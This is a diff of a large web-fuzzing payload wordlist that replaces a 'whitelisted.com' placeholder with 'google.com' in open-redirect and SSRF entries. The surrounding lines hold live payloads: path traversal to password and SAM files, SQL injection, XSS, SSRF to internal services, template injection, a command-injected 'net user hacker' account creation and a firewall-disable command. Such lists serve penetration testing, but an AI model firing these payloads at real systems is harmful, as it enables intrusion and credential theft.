@@ -4506,7 +4506,7 @@ glob://localhost:+11211aaa
 ////google.com@google.com/
 ///google.com@google.com//
 google.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-google.com/whitelisted.com
+google.com/google.com
 gopher://::1/server-status
 http://0xd8.0x3a.0xd6.0xce
 http:///////////google.com
@@ -4585,7 +4585,7 @@ type C:\Windows\repair\SAM
 /var/www/logs/error.log%00
 /var/www/logs/error_log%00
 ';WAITFOR DELAY '0:0:30'--
-whitelisted.com.google.com
+google.com.google.com
 //www.google.com/%2e%2e%2f
 //www.google.com/%2f%2e%2e
 \xampp\tomcat\conf\web.xml
@@ -4750,7 +4750,7 @@ type C:\WINNT\repair\SYSTEM
 /var/www/logs/access_log%00
 /var/www/mgr/logs/error.log
 /var/www/mgr/logs/error_log
-whitelisted.com;@google.com
+google.com;@google.com
 ///www.google.com/%2e%2e%2f
 ///www.google.com/%2f%2e%2e
 \xampp\mysql\data\mysql.err
@@ -4836,7 +4836,7 @@ ftp://localhost:00011211aaaa
 //google.com:80#@google.com/
 //google.com:80?@google.com/
 //google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-//google.com/whitelisted.com
+//google.com/google.com
 gopher://localhost:+11211aaa
 /home/apache/conf/httpd.conf
 http:[::ffff:216.58.214.206]
@@ -5019,11 +5019,11 @@ D:\inetpub\wwwroot\global.asa
 /etc/pure-ftpd/pure-ftpd.conf
 file://localhost:00011211aaaa
 glob://localhost:00011211aaaa
-google.com%23@whitelisted.com
+google.com%23@google.com
 //google.com@google.com/%2f..
 ///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 //google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-//google.com\@whitelisted.com
+//google.com\@google.com
  group by userid having 1=1--
 http:google.com@00330.3856078
 http://google.com@google.com/
@@ -5080,7 +5080,7 @@ type C:\Windows\repair\SYSTEM
 /var/log/apache/access_log%00
 /var/log/apache-ssl/error.log
 /var/log/mysql/mysql-slow.log
-//whitelisted.com@google.com/
+//google.com@google.com/
 \xampp\apache\conf\httpd.conf
 \xampp\apache\logs\access.log
 \xampp\phpmyadmin\phpinfo.php
@@ -5112,7 +5112,7 @@ zlib://localhost:00011211aaaa
 /%%32%65%%32%65%%32%66boot.ini
 /%%32%65%%32%65%%35%63boot.ini
 //%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/%5cwhitelisted.com@google.com
+/%5cgoogle.com@google.com
 79228162514264337593543950336B
 79228162514264337593543950336l
 79228162514264337593543950336L
@@ -5159,7 +5159,7 @@ ftp://simplessrf.domain_collab
 ///google.com@google.com/%2f..
 ////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 ///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-//google.com\twhitelisted.com/
+//google.com\tgoogle.com/
 http://[::ffff:216.58.214.206]
 http:google.com@0xd8.072.54990
 http://google.com@0xd8.3856078
@@ -5177,7 +5177,7 @@ https:///www.google.com/%2e%2e
 jar://simplessrf.domain_collab
 javascript://%250A1?alert(1):0
 javascript://%250Aalert(1)//?1
-Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
+Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
 ../../../../../logs/access.log
 net user hacker Password1 /ADD
 ogg://simplessrf.domain_collab
@@ -5208,8 +5208,8 @@ rar://simplessrf.domain_collab
 /var/log/apache-ssl/access.log
 /var/log/httpsd/ssl.access_log
 /../../var/www/logs/access_log
-///whitelisted.com@google.com/
-//whitelisted.com@google.com//
+///google.com@google.com/
+//google.com@google.com//
 \xampp\MercuryMail\mercury.ini
 zip://simplessrf.domain_collab
 
@@ -5228,7 +5228,7 @@ ${T(java.lang.System).getenv()}
 %00../../../../../../etc/passwd
 %00../../../../../../etc/shadow
 //%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-/%09/whitelisted.com@google.com
+/%09/google.com@google.com
 /..0x2f..0x2f..0x2f..0x2f..0x2f
 /..0x5c..0x5c..0x5c..0x5c..0x5c
 /%252e%252e/%252e%252e/boot.ini
@@ -5257,7 +5257,7 @@ ${T(java.lang.System).getenv()}
 /..%5c..%5c..%5c..%5cetc/passwd
 ..%5c..%5cboot.ini%00index.html
 ///%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-//%5cwhitelisted.com@google.com
+//%5cgoogle.com@google.com
 ' AND MID(VERSION(),1,1) = '5';
 ../../../apache/logs/access.log
 /../..//../..//../..///boot.ini
@@ -5332,8 +5332,8 @@ http:google.com@472.314.470.462
 https://google.com@google.com//
 /https://google.com@google.com/
 http://simplessrf.domain_collab
-http:whitelisted.com@0xd83ad6ce
-http:whitelisted.com@3627734734
+http:google.com@0xd83ad6ce
+http:google.com@3627734734
 http:XY>.7d8T\205pZM@0xd83ad6ce
 http:XY>.7d8T\205pZM@3627734734
 java%0d%0ascript%0d%0a:alert(0)
@@ -5360,16 +5360,16 @@ type %SYSTEMROOT%\repair\SYSTEM
 /var/log/mysql/mysql-bin.log%00
 /var/log/proftpd/xferlog.legacy
 ;waitfor delay '0:0:__TIME__'--
-////whitelisted.com@google.com/
-///whitelisted.com@google.com//
-whitelisted.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////google.com@google.com/
+///google.com@google.com//
+google.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 \..\..\..\..\..\WINDOWS\win.ini
 /www/logs/proftpd.system.log%00
 \xampp\webalizer\webalizer.conf
 zlib://simplessrf.domain_collab
  {${sleep(hexdec(dechex(20)))}} 
 ///%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-//%09/whitelisted.com@google.com
+//%09/google.com@google.com
 0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
 0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
 ..0x2f..0x2f..0x2f..0x2fboot.ini
@@ -5405,7 +5405,7 @@ zlib://simplessrf.domain_collab
 /%%32%65%%32%65%%35%63etc/passwd
 ..%5c..%5c/etc/passwd;index.html
 ////%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-///%5cwhitelisted.com@google.com
+///%5cgoogle.com@google.com
 /../../../../../../../../bin/id|
 .../.../.../.../.../.../boot.ini
 ...\...\...\...\...\...\boot.ini
@@ -5470,7 +5470,7 @@ Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 //Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@google.com/
 //Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@google.com/
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
+//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
 & net user hacker Password1 /ADD
 ; net user hacker Password1 /ADD
 | net user hacker Password1 /ADD
@@ -5504,7 +5504,7 @@ test*; perl -e 'print "X"x16096'
 /var/log/pure-ftpd/pure-ftpd.log
 ";waitfor delay '0:0:__TIME__'--
 );waitfor delay '0:0:__TIME__'--
-////whitelisted.com@google.com//
+////google.com@google.com//
 /..\..\..\..\..\..\winnt\win.ini
 \xampp\phpmyadmin\config.inc.php
 \xampp\phpMyAdmin\config.inc.php
@@ -5517,7 +5517,7 @@ x' AND members.email IS NULL; --
 //..\/..\/..\/..\/..\/..\/..\/..\
 /\../\../\../\../\../\../\../\../
 ////%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-///%09/whitelisted.com@google.com
+///%09/google.com@google.com
 /0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
 /0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
 /..0x2f..0x2f..0x2f..0x2fboot.ini
@@ -5538,7 +5538,7 @@ x' AND members.email IS NULL; --
 %2e%2e%5c/etc/passwd%00index.html
 ..%2f..%2f..%2f..%2f..%2fboot.ini
 ..%5c..%5c..%5c..%5c..%5cboot.ini
-////%5cwhitelisted.com@google.com
+////%5cgoogle.com@google.com
 ../../../../apache/logs/error.log
 /b'i'n/c'a't /e't'c/p'a's's'w'd' 
 ..../..../..../..../..../boot.ini
@@ -5592,8 +5592,8 @@ db.injection.insert({success:1});
 expect://simplessrf.domain_collab
 ftp://127.1.1.1:80\@127.2.2.2:80/
 {{ get_user_file("/etc/hosts") }}
-//google.com:80#@whitelisted.com/
-//google.com:80?@whitelisted.com/
+//google.com:80#@google.com/
+//google.com:80?@google.com/
 //google.com@google.com/%2e%2e%2f
 //google.com@google.com/%2f%2e%2e
 //google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
@@ -5615,16 +5615,16 @@ https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
 https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
 https:///www.google.com/%2f%2e%2e
 /https://www.google.com/%2f%2e%2e
-http:whitelisted.com@0xd8.3856078
-http://whitelisted.com@0xd83ad6ce
-http://whitelisted.com@3627734734
+http:google.com@0xd8.3856078
+http://google.com@0xd83ad6ce
+http://google.com@3627734734
 http://www.google.com\.google.com
 http:XY>.7d8T\205pZM@0xd8.3856078
 http://XY>.7d8T\205pZM@0xd83ad6ce
 http://XY>.7d8T\205pZM@3627734734
 jar://127.1.1.1:80\@127.2.2.2:80/
 LOAD_FILE('\\\\domain_collab\\a')
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
+//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@google.com
 mailto://simplessrf.domain_collab
 netsh firewall set opmode disable
 && net user hacker Password1 /ADD
@@ -5667,12 +5667,12 @@ test* | perl -e 'print "X"x16096'
 ../../../../../var/log/access_log
 ");waitfor delay '0:0:__TIME__'--
 ));waitfor delay '0:0:__TIME__'--
-/\whitelisted.com:80%40google.com
-//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/\google.com:80%40google.com
+//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 \xampp\MercuryMail\LOGS\error.log
 x' or name()='username' or 'x'='y
 zip://127.1.1.1:80\@127.2.2.2:80/
-////%09/whitelisted.com@google.com
+////%09/google.com@google.com
 1)) or benchmark(10000000,MD5(1))#
 /%252e%252e/%252e%252e/%252e%252e/
 /%252e%252e\%252e%252e\%252e%252e\
@@ -5685,7 +5685,7 @@ zip://127.1.1.1:80\@127.2.2.2:80/
 /..%5c..%5c..%5c..%5c..%5cboot.ini
 ..%5c..%5c..%5cboot.ini;index.html
 ..%5c..%5c/etc/passwd%00index.html
-/%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
  and 1 in (select var from temp)--
 ../../../../apache/logs/access.log
 ../..//../..//../..//..///boot.ini
@@ -5739,24 +5739,24 @@ http://google.com:80%40google.com/
 http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\tgoogle.com/
 https://google.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-https://google.com#whitelisted.com
-https://google.com/whitelisted.com
-https://google.com?whitelisted.com
-https://google.com\whitelisted.com
+https://google.com#google.com
+https://google.com/google.com
+https://google.com?google.com
+https://google.com\google.com
 //https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 /https:///Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://whitelisted.com.google.com
-https://whitelisted.com@google.com
+https://google.com.google.com
+https://google.com@google.com
 //https://www.google.com/%2e%2e%2f
 /https:///www.google.com/%2f%2e%2e
-http:whitelisted.com@00330.3856078
-http://whitelisted.com@google.com/
+http:google.com@00330.3856078
+http://google.com@google.com/
 http:XY>.7d8T\205pZM@00330.3856078
 <IMG SRC="javascript:alert('XSS')"
 <img \x00src=x onerror="alert(1)">
 jar://127.1.1.1:80\@@127.2.2.2:80/
 ldap://127.1.1.1:80\@127.2.2.2:80/
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
+//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\tgoogle.com/
 ogg://127.1.1.1:80\@@127.2.2.2:80/
 ")) or benchmark(10000000,MD5(1))#
 phar://127.1.1.1:80\@127.2.2.2:80/
@@ -5784,16 +5784,16 @@ tftp://127.1.1.1:80\@127.2.2.2:80/
 /var/lib/php/session/sess_<sessid>
 /var/log/exim_rejectlog/etc/passwd
 "));waitfor delay '0:0:__TIME__'--
-//whitelisted.com@google.com/%2f..
-///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+//google.com@google.com/%2f..
+///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 \..\..\..\..\..\..\WINDOWS\win.ini
 \xampp\FileZillaFTP\Logs\error.log
 \xampp\MercuryMail\LOGS\access.log
 <xml SRC="xsstest.xml" ID=I></xml>
 zip://127.1.1.1:80\@@127.2.2.2:80/
 zlib://127.1.1.1:80\@127.2.2.2:80/
-/%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 &%0d%0a1Location:https://google.com
 0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
@@ -5822,7 +5822,7 @@ zlib://127.1.1.1:80\@127.2.2.2:80/
 ..2f..2f..2fapache2flogs2ferror.log
 ..%%32%66..%%32%66..%%32%66boot.ini
 ..%%35%63..%%35%63..%%35%63boot.ini
-//%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /../..//../..//../..//..///boot.ini
 /..\..\\..\..\\..\..\\..\\\boot.ini
 /%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
@@ -5876,15 +5876,15 @@ http:google.com@0xd8.0x3a.0xd6.0xce
 http://google.com%2eⓁ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 http://google.com%2f%2f.google.com/
 http://google.com%5c%5c.google.com/
-http://google.com\twhitelisted.com/
+http://google.com\tgoogle.com/
 https://127.1.1.1:80\@127.2.2.2:80/
 https://google.com@google.com/%2f..
 https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 /https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-https://whitelisted.com;@google.com
-https://whitelisted.com@google.com/
-http:whitelisted.com@0xd8.072.54990
-http://whitelisted.com@0xd8.3856078
+https://google.com;@google.com
+https://google.com@google.com/
+http:google.com@0xd8.072.54990
+http://google.com@0xd8.3856078
 http:XY>.7d8T\205pZM@0xd8.072.54990
 http://XY>.7d8T\205pZM@0xd8.3856078
 '\"><img src=//vps_ip:80/oobxss.js>
@@ -5919,9 +5919,9 @@ tftp://127.1.1.1:80\@@127.2.2.2:80/
 /var/log/ftp-proxy/ftp-proxy.log%00
 /var/log/pure-ftpd/pure-ftpd.log%00
 /var/www/localhost/htdocs/.htaccess
-///whitelisted.com@google.com/%2f..
-////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+///google.com@google.com/%2f..
+////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 \xampp\FileZillaFTP\Logs\access.log
 \xampp\tomcat\conf\tomcat-users.xml
 zlib://127.1.1.1:80\@@127.2.2.2:80/
@@ -5934,7 +5934,7 @@ zlib://127.1.1.1:80\@@127.2.2.2:80/
 /.//..//.//..//.//..//.//..//.//..//
 /.\..\.\..\.\..\.\..\.\..\.\..\.\..\
 /.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\
-//%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
 %252e%252e%252fboot.ini%00index.html
@@ -5965,7 +5965,7 @@ zlib://127.1.1.1:80\@@127.2.2.2:80/
 ..%5c..%5c..%5c..%5c..%5c/etc/passwd
 /..%5c..%5c..%5c..%5c..%5cetc/passwd
 ..%5c..%5c..%5cboot.ini%00index.html
-///%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ../../../../../apache/logs/error.log
 {{app.request.server.all|join(',')}}
 .../.../.../.../.../.../.../boot.ini
@@ -6021,11 +6021,11 @@ https://127.1.1.1:80\@@127.2.2.2:80/
 https://%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /https://google.com@google.com/%2f..
 https://:@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@google.com
-https://whitelisted.com@google.com//
-/https://whitelisted.com@google.com/
-http://whitelisted.com@00330.3856078
-http://whitelisted.com%2egoogle.com/
-http:whitelisted.com@472.314.470.462
+https://google.com@google.com//
+/https://google.com@google.com/
+http://google.com@00330.3856078
+http://google.com%2egoogle.com/
+http:google.com@472.314.470.462
 http://XY>.7d8T\205pZM@00330.3856078
 http:XY>.7d8T\205pZM@472.314.470.462
 jar://ssrf1.domain_collab$google.com
@@ -6051,14 +6051,14 @@ telnet://127.1.1.1:80\@127.2.2.2:80/
 /usr/local/etc/httpd/logs/access_log
 /usr/local/pureftpd/etc/pureftpd.pdb
 /var/log/exim_rejectlog%00/etc/issue
-whitelisted.com@%E2%80%AE@google.com
-///whitelisted.com@google.com/%2e%2e
-////whitelisted.com@google.com/%2f..
-////whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+google.com@%E2%80%AE@google.com
+///google.com@google.com/%2e%2e
+////google.com@google.com/%2f..
+////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
 zip://ssrf1.domain_collab$google.com
 /./\/././\/././\/././\/././\/././\/./
 /.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\
-///%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f
@@ -6081,7 +6081,7 @@ zip://ssrf1.domain_collab$google.com
 /..%%32%66..%%32%66..%%32%66..%%32%66
 /..%%35%63..%%35%63..%%35%63..%%35%63
 ..%5c..%5c..%5c/etc/passwd;index.html
-////%5cwhitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ../../../../../apache/logs/access.log
 "><base href='http://domain_collab/'>
 ../..//../..//../..//../..///boot.ini
@@ -6136,28 +6136,28 @@ http:3H6k7lIAiqjfNeN@00330.0x3a.54990
 http://3H6k7lIAiqjfNeN@0xd8.072.54990
 http://%67%6f%6f%67%6c%65%2e%63%6f%6d
 http://google.com@0xd8.0x3a.0xd6.0xce
-http://google.com%23.whitelisted.com/
-http://google.com%3F.whitelisted.com/
+http://google.com%23.google.com/
+http://google.com%3F.google.com/
 http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@google.com/
 http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@google.com/
 https://%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /https://%5cgoogle.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https://%5cwhitelisted.com@google.com
+https://%5cgoogle.com@google.com
 https:///google.com@google.com/%2e%2e
 /https://google.com@google.com/%2e%2e
 //https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
-https://:@google.com\@whitelisted.com
+https://:@google.com\@google.com
 http://ssrf1.domain_collab$google.com
-http:whitelisted.com@00330.0x3a.54990
-http://whitelisted.com@0xd8.072.54990
+http:google.com@00330.0x3a.54990
+http://google.com@0xd8.072.54990
 http://www.Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.google.com
 http:XY>.7d8T\205pZM@00330.0x3a.54990
 http://XY>.7d8T\205pZM@0xd8.072.54990
 <IMG SRC= onmouseover="alert('xxs')">
 ldap://ssrf1.domain_collab$google.com
 LIMIT 0,1         -> LIMIT 1 OFFSET 0
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
-//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
+//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@google.com/
+//Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@google.com/
 mailto://127.1.1.1:80\@@127.2.2.2:80/
 phar://ssrf1.domain_collab$google.com
 "><portal src='https://domain_collab?
@@ -6185,9 +6185,9 @@ tftp://ssrf1.domain_collab$google.com
 /usr/local/etc/apache/conf/httpd.conf
 ../../../../../var/www/logs/error.log
 ../../../../../var/www/logs/error_log
-////whitelisted.com@google.com/%2e%2e
+////google.com@google.com/%2e%2e
 zlib://ssrf1.domain_collab$google.com
-////%09/whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%09/google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\etc/passwd
 0x2e0x2e/0x2e0x2e/0x2e0x2e//etc/passwd
@@ -6245,17 +6245,17 @@ declare @q nvarchar (4000) select @q =
 http://3H6k7lIAiqjfNeN@472.314.470.462
 /http://%67%6f%6f%67%6c%65%2e%63%6f%6d
 http://google.com:80%40Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://google.com:80#@whitelisted.com/
-http://google.com:80?@whitelisted.com/
-https://%09/whitelisted.com@google.com
-/https://%5cwhitelisted.com@google.com
+http://google.com:80#@google.com/
+http://google.com:80?@google.com/
+https://%09/google.com@google.com
+/https://%5cgoogle.com@google.com
 https://google.com/https://google.com/
-https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
+https://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/google.com
 https://ssrf1.domain_collab$google.com
-//https://whitelisted.com@google.com//
-https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-http://whitelisted.com@472.314.470.462
-http://www.google.com\.whitelisted.com
+//https://google.com@google.com//
+https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://google.com@472.314.470.462
+http://www.google.com\.google.com
 http://XY>.7d8T\205pZM@472.314.470.462
 <!--#include virtual="/index.html" -->
 ldap://localhost:11211/%0astats%0aquit
@@ -6273,9 +6273,9 @@ ldap://localhost:11211/%0astats%0aquit
 ../../../../../var/log/nginx/error.log
 ../../../../../var/log/nginx/error_log
 ../../../../../var/www/logs/access.log
-//whitelisted.com@google.com/%2e%2e%2f
-//whitelisted.com@google.com/%2f%2e%2e
-//whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+//google.com@google.com/%2e%2e%2f
+//google.com@google.com/%2f%2e%2e
+//google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
 ../../../../../../../../../../../../../
 %09Jav%09ascript:alert(document.domain)
 /..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
@@ -6353,7 +6353,7 @@ expect://ssrf1.domain_collab$google.com
 //google.com@https:///google.com/%2e%2e
 ////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
 ////google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-//google.com\@www.whitelisteddomain.tld
+//google.com\@www.google.com
 gopher://ssrf1.domain_collab$google.com
 http://3H6k7lIAiqjfNeN@00330.0x3a.54990
 http:3H6k7lIAiqjfNeN@0330.072.0326.0316
@@ -6361,16 +6361,16 @@ http:3H6k7lIAiqjfNeN@[::216.58.214.206]
 http:google.com@[::ffff:216.58.214.206]
 http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.google.com/
 http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.google.com/
-http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twhitelisted.com/
+http://Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\tgoogle.com/
 https://google.com@google.com/%2e%2e%2f
 https://google.com@google.com/%2f%2e%2e
 https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
-https://whitelisted.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
-https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://whitelisted.com@00330.0x3a.54990
-http:whitelisted.com@0330.072.0326.0316
-http:whitelisted.com@[::216.58.214.206]
-http://whitelisted.com:80%40google.com/
+https://google.com;@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://google.com@00330.0x3a.54990
+http:google.com@0330.072.0326.0316
